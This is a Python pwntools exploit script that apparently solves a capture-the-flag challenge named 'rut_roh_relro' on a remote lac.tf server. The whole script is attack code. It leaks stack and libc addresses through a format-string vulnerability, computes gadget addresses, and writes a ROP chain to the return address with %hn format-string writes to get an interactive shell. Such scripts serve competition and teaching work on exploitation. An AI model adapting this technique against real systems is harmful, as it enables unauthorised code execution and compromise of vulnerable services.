from pwn import *

libc = ELF("./libc.so.6")
# p = process("./rut_roh_relro")
p = remote("lac.tf", 31134)

p.sendlineafter(b"post?\n", b"start %72$p %5$p end")
p.recvuntil(b"start ")
[stack_leak, libc_leak] = [int(x, 16) for x in p.recvuntil(b" end", drop=True).split(b" ")]
libc_base = libc_leak - 0x1cfbe0
one_gadget = libc_base + 0xc9620
rop_start = stack_leak - 0xf0
pop_rsi = libc_base + 0x2590f
print("rop start:", hex(rop_start))
print("one gadget:", hex(one_gadget))

vals = []
accum = (one_gadget << 128) | (0 << 64) | pop_rsi
for _ in range(12):
    v = ((accum & 0xffff) - sum(vals)) & 0xffff
    if 0 < v < 8:
        v += 0x10000
    vals.append(v)
    accum >>= 16

pl = b""
print(vals)
for i in range(len(vals)):
    if vals[i] != 0:
        pl += f"%{vals[i]}x%{38+i}$hn".encode()
    else:
        pl += f"%{38+i}$hn".encode()
pl = pl.ljust(0x100, b"X")
pl += b"".join((rop_start + 2 * i).to_bytes(8, "little") for i in range(12))
p.sendlineafter(b"post?\n", pl)

p.recvuntil(b"Bye!\n")
p.interactive()

